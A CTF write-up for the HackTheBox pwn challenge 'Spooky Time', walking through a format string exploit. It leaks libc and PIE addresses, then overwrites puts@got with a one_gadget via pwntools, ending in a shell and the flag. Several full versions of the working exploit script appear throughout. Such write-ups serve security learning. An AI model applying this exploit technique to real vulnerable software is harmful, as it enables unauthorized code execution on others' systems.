# Spooky Time
> Write-up author: jon-brandy

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/2a7a0e03-821f-4581-9bb2-92aad74eba63)

## Lessons Learned:
1. Stack-Based Exploitation.
2. Exploiting FSB Bug.
3. Overwrite puts@got with one gadget.


## DESCRIPTION:
Everyone loves a good jumpscare, especially kids or the person who does it.. Try to scare them all!

## STEPS:
1. In this challenge we're given a 64 bit binary, not stripped, and dynamically linked.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/2f1cbd77-dfeb-48ee-8e73-15e8100c186f)

#### NOTES: There's a libc too..

> BINARY PROTECTIONS

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/dd076476-71f6-4a4b-935b-d38ee880e664)


2. Remembering there's `No Relro`, hence the concept here might be somehow related to **overwrite Global Offset Table (GOT) with format string vuln**.
3. Also there is PIE which we need to bypass to overwrite the function and there's canary which we need to leak in order to control the return address.
4. Anyway after i decompiled the binary, it seems we don't have to leak the canary, we just need to leak the PIE and calculate the PIE Base.
5. The challenge is very straight forward, we can leak the libc and pie with the second format strings vuln (it accepts up to 299 bytes).

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b0376aa6-f831-4333-803b-ff1c39d07fd9)


6. At glance, the function we need to overwrite seems the `puts()`.
7. Let's see if there are any `one_gadget` we can use.

> LIST OF ONE_GADGET AVAIL

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/76cf0edf-ac39-4e80-a9c9-b53385f6bf29)


8. Great we got few, it seems the 3rd and 4th shall be our interest.
9. Let's start leaking the libc and pie.

> UTILIZE THE 2ND FORMAT STRINGS VULN

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c8ffcd9c-1c79-4843-afd8-3e3d55a4f520)


10. Based from the result, let's use this 2 potential address.

> 1st box --> potential libc, 2nd box --> potential piebase.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e06de079-13ec-46d9-bc33-0e0debd29b74)


11. Let's calculate them.

#### NOTES: We leak it at the 2nd vuln, but to access it, must at the 1st vuln (so we won't get EOF and we can calc the pie & libc base) 

> SCRIPT 

```py
from pwn import *
import os 

os.system('clear')

def start(argv=[],  *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2],  *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# for remote solve
gdbscript = '''
init-pwndbg
piebase
breakrva 0x1492
continue
'''.format(**locals())

exe = './spooky_time'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'

library = './glibc/libc.so.6'
libc = context.binary = ELF(library, checksec=False)

sh = start()
pause()

sh.sendline('%3$p.%51$p')
sh.recvuntil(b'than')
sh.recvline()
get = sh.recvlineS()
print('GRABBED:',get)

potential_libc_leak = get[:14]
#print(potential_libc_leak)
libc_leak = int(potential_libc_leak, 16)
log.info('LIBC_LEAK --> %#0x', libc_leak)
pie_base_leak = get[15:]
pie_leak = int(pie_base_leak, 16)
log.info('PIE_LEAK --> %#0x', pie_leak)
#print(pie_base_leak)

sh.interactive()
```

> CALCULATING THE LIBC_BASE

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/df45296e-cae9-4ddd-a2f0-4a1e2a9f2169)


From the **vmmap** result we know the libc_base is --> 0x7f0516c00000

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1d4e4ce5-7a30-4547-90a3-ae466e3099a6)


Calculate result --> 1133111

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/06ffdf84-ffb7-4fdc-b8b7-a9700c6fb1b0)


Let's get the pie_base --> 5056

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b9826cfc-c2a2-414a-82d9-0fbcb0c7bc91)


> SCRIPT PT.2

```py
from pwn import *
import os 

os.system('clear')

def start(argv=[],  *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2],  *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# for remote solve
gdbscript = '''
init-pwndbg
piebase
breakrva 0x1492
continue
'''.format(**locals())

exe = './spooky_time'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'

library = './glibc/libc.so.6'
libc = context.binary = ELF(library, checksec=False)

sh = start()
pause()

sh.sendline('%3$p.%51$p')
sh.recvuntil(b'than')
sh.recvline()
get = sh.recvlineS()
print('GRABBED:',get)

potential_libc_leak = get[:14]
#print(potential_libc_leak)
libc_leak = int(potential_libc_leak, 16)
log.info('LIBC_LEAK --> %#0x', libc_leak)
pie_base_leak = get[15:]
pie_leak = int(pie_base_leak, 16)
log.info('PIE_LEAK --> %#0x', pie_leak)
#print(pie_base_leak)

elf.address = pie_leak - 0x13c0 #5056 
log.info('Calculated base address --> %#0x', elf.address)

libc.address = libc_leak - 0x114a37 #1133111
log.info('Calculated lib_base --> %#0x', libc.address)

sh.interactive()
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d6990bee-61d2-4ef3-92fa-7dd469c75bce)


12. Great! Now we need to choose the correct **one_gadget**, let's start by using the 3rd one and bruteforce the correct offset.

> SCRIPT PT.3

```py
from pwn import *
import os 

os.system('clear')

def start(argv=[],  *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2],  *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# for remote solve
gdbscript = '''
init-pwndbg
piebase
breakrva 0x1492
continue
'''.format(**locals())

exe = './spooky_time'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'

library = './glibc/libc.so.6'
libc = context.binary = ELF(library, checksec=False)

sh = start()
#pause()

sh.sendline('%3$p.%51$p')
sh.recvuntil(b'than')
sh.recvline()
get = sh.recvlineS()
print('GRABBED:',get)

potential_libc_leak = get[:14]
#print(potential_libc_leak)
libc_leak = int(potential_libc_leak, 16)
log.info('LIBC_LEAK --> %#0x', libc_leak)
pie_base_leak = get[15:]
pie_leak = int(pie_base_leak, 16)
log.info('PIE_LEAK --> %#0x', pie_leak)
#print(pie_base_leak)

elf.address = pie_leak - 0x13c0 #5056 
log.info('Calculated base address --> %#0x', elf.address)

libc.address = libc_leak - 0x114a37 #1133111
log.info('Calculated lib_base --> %#0x', libc.address)

offset = 1
one_gadget = libc.address + 0xebcf5
payload = fmtstr_payload(offset, {elf.got['puts'] : one_gadget}) # overwrite puts@got
sh.sendlineafter(b'time..\n\n', payload)

sh.interactive()
```

14. Anyway there must be the intended solution to get the offset, but in this case i bruteforced it from number 1 to 20 and i got it correct at offset 8.

> FINAL SCRIPT

```py
from pwn import *
import os 

os.system('clear')

def start(argv=[],  *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2],  *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# for remote solve
gdbscript = '''
init-pwndbg
piebase
breakrva 0x1492
continue
'''.format(**locals())

exe = './spooky_time'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'

library = './glibc/libc.so.6'
libc = context.binary = ELF(library, checksec=False)

sh = start()
#pause()

sh.sendline('%3$p.%51$p')
sh.recvuntil(b'than')
sh.recvline()
get = sh.recvlineS()
print('GRABBED:',get)

potential_libc_leak = get[:14]
#print(potential_libc_leak)
libc_leak = int(potential_libc_leak, 16)
log.info('LIBC_LEAK --> %#0x', libc_leak)
pie_base_leak = get[15:]
pie_leak = int(pie_base_leak, 16)
log.info('PIE_LEAK --> %#0x', pie_leak)
#print(pie_base_leak)

elf.address = pie_leak - 0x13c0 #5056 
log.info('Calculated base address --> %#0x', elf.address)

libc.address = libc_leak - 0x114a37 #1133111
log.info('Calculated lib_base --> %#0x', libc.address)

offset = 8
one_gadget = libc.address + 0xebcf5 # 3rd one_gadget
payload = fmtstr_payload(offset, {elf.got['puts'] : one_gadget}) # overwrite puts@got
sh.sendlineafter(b'time..\n\n', payload)

sh.interactive()
```

> RESULT (LOCAL)

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/97d0641f-bc74-42ce-90b5-a38c18818dc8)


> TEST REMOTELY

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/7a8c3781-3952-4d61-95c8-beff26b5732b)


15. Got the flag!

## FLAG

```
HTB{d0ubl3_f0rm4t_5tr1ng_w1th_r3lR0}
```

